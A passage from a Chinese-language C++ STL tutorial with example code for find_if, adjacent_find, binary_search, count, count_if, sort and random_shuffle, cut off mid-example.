class="string">&quot;找到姓名:&quot;</span> &lt;&lt; it-&gt;m_Name &lt;&lt; <span class="string">&quot; 年龄: &quot;</span> &lt;&lt; it-&gt;m_Age &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结： 利用find可以在容器中找指定的元素，返回值是<strong>迭代器</strong></p>
<h4 id="5-2-2-find-if"><a href="#5-2-2-find-if" class="headerlink" title="5.2.2 find_if"></a>5.2.2 find_if</h4><p><strong>功能描述：</strong></p>
<ul>
<li>按条件查找元素</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><p><code>find_if(iterator beg, iterator end, _Pred);  </code></p>
<p>&#x2F;&#x2F; 按值查找元素，找到返回指定位置迭代器，找不到返回结束迭代器位置</p>
<p>&#x2F;&#x2F; beg 开始迭代器</p>
<p>&#x2F;&#x2F; end 结束迭代器</p>
<p>&#x2F;&#x2F; _Pred 函数或者谓词（返回bool类型的仿函数）</p>
</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//内置数据类型</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GreaterFive</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> val)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> val &gt; <span class="number">5</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">		v.<span class="built_in">push_back</span>(i + <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	vector&lt;<span class="type">int</span>&gt;::iterator it = <span class="built_in">find_if</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), <span class="built_in">GreaterFive</span>());</span><br><span class="line">	<span class="keyword">if</span> (it == v.<span class="built_in">end</span>()) &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;没有找到!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;找到大于5的数字:&quot;</span> &lt;&lt; *it &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义数据类型</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>(string name, <span class="type">int</span> age)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Name = name;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Age = age;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	string m_Name;</span><br><span class="line">	<span class="type">int</span> m_Age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Greater20</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(Person &amp;p)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> p.m_Age &gt; <span class="number">20</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	vector&lt;Person&gt; v;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建数据</span></span><br><span class="line">	<span class="function">Person <span class="title">p1</span><span class="params">(<span class="string">&quot;aaa&quot;</span>, <span class="number">10</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p2</span><span class="params">(<span class="string">&quot;bbb&quot;</span>, <span class="number">20</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p3</span><span class="params">(<span class="string">&quot;ccc&quot;</span>, <span class="number">30</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p4</span><span class="params">(<span class="string">&quot;ddd&quot;</span>, <span class="number">40</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">	v.<span class="built_in">push_back</span>(p1);</span><br><span class="line">	v.<span class="built_in">push_back</span>(p2);</span><br><span class="line">	v.<span class="built_in">push_back</span>(p3);</span><br><span class="line">	v.<span class="built_in">push_back</span>(p4);</span><br><span class="line"></span><br><span class="line">	vector&lt;Person&gt;::iterator it = <span class="built_in">find_if</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), <span class="built_in">Greater20</span>());</span><br><span class="line">	<span class="keyword">if</span> (it == v.<span class="built_in">end</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;没有找到!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;找到姓名:&quot;</span> &lt;&lt; it-&gt;m_Name &lt;&lt; <span class="string">&quot; 年龄: &quot;</span> &lt;&lt; it-&gt;m_Age &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//test01();</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">test02</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：find_if按条件查找使查找更加灵活，提供的仿函数可以改变不同的策略</p>
<h4 id="5-2-3-adjacent-find"><a href="#5-2-3-adjacent-find" class="headerlink" title="5.2.3 adjacent_find"></a>5.2.3 adjacent_find</h4><p><strong>功能描述：</strong></p>
<ul>
<li>查找相邻重复元素</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><p><code>adjacent_find(iterator beg, iterator end);  </code></p>
<p>&#x2F;&#x2F; 查找相邻重复元素,返回相邻元素的第一个位置的迭代器</p>
<p>&#x2F;&#x2F; beg 开始迭代器</p>
<p>&#x2F;&#x2F; end 结束迭代器</p>
</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">1</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">2</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">5</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">2</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">4</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">4</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//查找相邻重复元素</span></span><br><span class="line">	vector&lt;<span class="type">int</span>&gt;::iterator it = <span class="built_in">adjacent_find</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>());</span><br><span class="line">	<span class="keyword">if</span> (it == v.<span class="built_in">end</span>()) &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;找不到!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;找到相邻重复元素为:&quot;</span> &lt;&lt; *it &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：面试题中如果出现查找相邻重复元素，记得用STL中的adjacent_find算法</p>
<h4 id="5-2-4-binary-search"><a href="#5-2-4-binary-search" class="headerlink" title="5.2.4 binary_search"></a>5.2.4 binary_search</h4><p><strong>功能描述：</strong></p>
<ul>
<li>查找指定元素是否存在</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><p><code>bool binary_search(iterator beg, iterator end, value);  </code></p>
<p>&#x2F;&#x2F; 查找指定的元素，查到 返回true  否则false</p>
<p>&#x2F;&#x2F; 注意: 在<strong>无序序列中不可用</strong></p>
<p>&#x2F;&#x2F; beg 开始迭代器</p>
<p>&#x2F;&#x2F; end 结束迭代器</p>
<p>&#x2F;&#x2F; value 查找的元素</p>
</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt;v;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		v.<span class="built_in">push_back</span>(i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//二分查找</span></span><br><span class="line">	<span class="type">bool</span> ret = <span class="built_in">binary_search</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(),<span class="number">2</span>);</span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;找到了&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;未找到&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>总结：</strong>二分查找法查找效率很高，值得注意的是查找的容器中元素必须的有序序列</p>
<h4 id="5-2-5-count"><a href="#5-2-5-count" class="headerlink" title="5.2.5 count"></a>5.2.5 count</h4><p><strong>功能描述：</strong></p>
<ul>
<li>统计元素个数</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><p><code>count(iterator beg, iterator end, value);  </code></p>
<p>&#x2F;&#x2F; 统计元素出现次数</p>
<p>&#x2F;&#x2F; beg 开始迭代器</p>
<p>&#x2F;&#x2F; end 结束迭代器</p>
<p>&#x2F;&#x2F; value 统计的元素</p>
</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//内置数据类型</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">1</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">2</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">4</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">5</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">3</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">4</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> num = <span class="built_in">count</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;4的个数为： &quot;</span> &lt;&lt; num &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义数据类型</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>(string name, <span class="type">int</span> age)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Name = name;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Age = age;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">bool</span> <span class="keyword">operator</span>==(<span class="type">const</span> Person &amp; p)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>-&gt;m_Age == p.m_Age)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	string m_Name;</span><br><span class="line">	<span class="type">int</span> m_Age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vector&lt;Person&gt; v;</span><br><span class="line"></span><br><span class="line">	<span class="function">Person <span class="title">p1</span><span class="params">(<span class="string">&quot;刘备&quot;</span>, <span class="number">35</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p2</span><span class="params">(<span class="string">&quot;关羽&quot;</span>, <span class="number">35</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p3</span><span class="params">(<span class="string">&quot;张飞&quot;</span>, <span class="number">35</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p4</span><span class="params">(<span class="string">&quot;赵云&quot;</span>, <span class="number">30</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p5</span><span class="params">(<span class="string">&quot;曹操&quot;</span>, <span class="number">25</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">	v.<span class="built_in">push_back</span>(p1);</span><br><span class="line">	v.<span class="built_in">push_back</span>(p2);</span><br><span class="line">	v.<span class="built_in">push_back</span>(p3);</span><br><span class="line">	v.<span class="built_in">push_back</span>(p4);</span><br><span class="line">	v.<span class="built_in">push_back</span>(p5);</span><br><span class="line">    </span><br><span class="line">    <span class="function">Person <span class="title">p</span><span class="params">(<span class="string">&quot;诸葛亮&quot;</span>,<span class="number">35</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> num = <span class="built_in">count</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), p);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;num = &quot;</span> &lt;&lt; num &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//test01();</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">test02</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>总结：</strong> 统计自定义数据类型时候，需要配合重载 <code>operator==</code></p>
<h4 id="5-2-6-count-if"><a href="#5-2-6-count-if" class="headerlink" title="5.2.6 count_if"></a>5.2.6 count_if</h4><p><strong>功能描述：</strong></p>
<ul>
<li>按条件统计元素个数</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><p><code>count_if(iterator beg, iterator end, _Pred);  </code></p>
<p>&#x2F;&#x2F; 按条件统计元素出现次数</p>
<p>&#x2F;&#x2F; beg 开始迭代器</p>
<p>&#x2F;&#x2F; end 结束迭代器</p>
<p>&#x2F;&#x2F; _Pred 谓词</p>
</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Greater4</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> val)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> val &gt;= <span class="number">4</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//内置数据类型</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">1</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">2</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">4</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">5</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">3</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">4</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> num = <span class="built_in">count_if</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), <span class="built_in">Greater4</span>());</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;大于4的个数为： &quot;</span> &lt;&lt; num &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义数据类型</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>(string name, <span class="type">int</span> age)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Name = name;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Age = age;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	string m_Name;</span><br><span class="line">	<span class="type">int</span> m_Age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AgeLess35</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">const</span> Person &amp;p)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> p.m_Age &lt; <span class="number">35</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vector&lt;Person&gt; v;</span><br><span class="line"></span><br><span class="line">	<span class="function">Person <span class="title">p1</span><span class="params">(<span class="string">&quot;刘备&quot;</span>, <span class="number">35</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p2</span><span class="params">(<span class="string">&quot;关羽&quot;</span>, <span class="number">35</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p3</span><span class="params">(<span class="string">&quot;张飞&quot;</span>, <span class="number">35</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p4</span><span class="params">(<span class="string">&quot;赵云&quot;</span>, <span class="number">30</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p5</span><span class="params">(<span class="string">&quot;曹操&quot;</span>, <span class="number">25</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">	v.<span class="built_in">push_back</span>(p1);</span><br><span class="line">	v.<span class="built_in">push_back</span>(p2);</span><br><span class="line">	v.<span class="built_in">push_back</span>(p3);</span><br><span class="line">	v.<span class="built_in">push_back</span>(p4);</span><br><span class="line">	v.<span class="built_in">push_back</span>(p5);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> num = <span class="built_in">count_if</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), <span class="built_in">AgeLess35</span>());</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;小于35岁的个数：&quot;</span> &lt;&lt; num &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//test01();</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">test02</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>总结：</strong>按值统计用count，按条件统计用count_if</p>
<h3 id="5-3-常用排序算法"><a href="#5-3-常用排序算法" class="headerlink" title="5.3 常用排序算法"></a>5.3 常用排序算法</h3><p><strong>学习目标：</strong></p>
<ul>
<li>掌握常用的排序算法</li>
</ul>
<p><strong>算法简介：</strong></p>
<ul>
<li><code>sort</code>             &#x2F;&#x2F;对容器内元素进行排序</li>
<li><code>random_shuffle</code>   &#x2F;&#x2F;洗牌   指定范围内的元素随机调整次序</li>
<li><code>merge </code>           &#x2F;&#x2F; 容器元素合并，并存储到另一容器中</li>
<li><code>reverse</code>       &#x2F;&#x2F; 反转指定范围的元素</li>
</ul>
<h4 id="5-3-1-sort"><a href="#5-3-1-sort" class="headerlink" title="5.3.1 sort"></a>5.3.1 sort</h4><p><strong>功能描述：</strong></p>
<ul>
<li>对容器内元素进行排序</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><p><code>sort(iterator beg, iterator end, _Pred);  </code></p>
<p>&#x2F;&#x2F; 按值查找元素，找到返回指定位置迭代器，找不到返回结束迭代器位置</p>
<p>&#x2F;&#x2F;  beg    开始迭代器</p>
<p>&#x2F;&#x2F;  end    结束迭代器</p>
<p>&#x2F;&#x2F; _Pred  谓词</p>
</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myPrint</span><span class="params">(<span class="type">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; val &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">10</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">30</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">50</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">20</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">40</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//sort默认从小到大排序</span></span><br><span class="line">	<span class="built_in">sort</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>());</span><br><span class="line">	for_each(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), myPrint);</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//从大到小排序</span></span><br><span class="line">	<span class="built_in">sort</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), <span class="built_in">greater</span>&lt;<span class="type">int</span>&gt;());</span><br><span class="line">	for_each(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), myPrint);</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>总结：</strong>sort属于开发中最常用的算法之一，需熟练掌握</p>
<h4 id="5-3-2-random-shuffle"><a href="#5-3-2-random-shuffle" class="headerlink" title="5.3.2 random_shuffle"></a>5.3.2 random_shuffle</h4><p><strong>功能描述：</strong></p>
<ul>
<li>洗牌   指定范围内的元素随机调整次序</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><p><code>random_shuffle(iterator beg, iterator end);  </code></p>
<p>&#x2F;&#x2F; 指定范围内的元素随机调整次序</p>
<p>&#x2F;&#x2F; beg 开始迭代器</p>
<p>&#x2F;&#x2F; end 结束迭代器</p>
</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctime&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">myPrint</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> val)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; val &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">srand</span>((<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">10</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		v.<span class="built_in">push_back</span>(i);</span><br><span class="line">	&#125;</span><br><span class="line">	for_each(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), <span class="built_in">myPrint</span>());</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//打乱顺序</span></span><br><span class="line">	<span class="built_in">random_shuffle</span>(v.<span 